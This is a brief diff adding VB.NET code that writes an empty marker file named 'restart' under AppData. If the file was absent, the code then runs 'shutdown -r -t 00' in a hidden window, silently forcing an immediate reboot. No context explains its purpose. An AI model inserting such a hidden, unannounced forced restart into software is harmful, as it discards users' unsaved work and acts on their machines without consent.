@@ -1,0 +1,6 @@
+Dim bytloc As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\restart"
+If Not IO.File.Exists(bytloc) Then
+   Dim filebyt As Byte() = New Byte() {}
+   My.Computer.FileSystem.WriteAllBytes(bytloc, filebyt, False)
+   Microsoft.VisualBasic.Shell("shutdown -r -t" & " 00", Microsoft.VisualBasic.AppWinStyle.Hide)
+End If
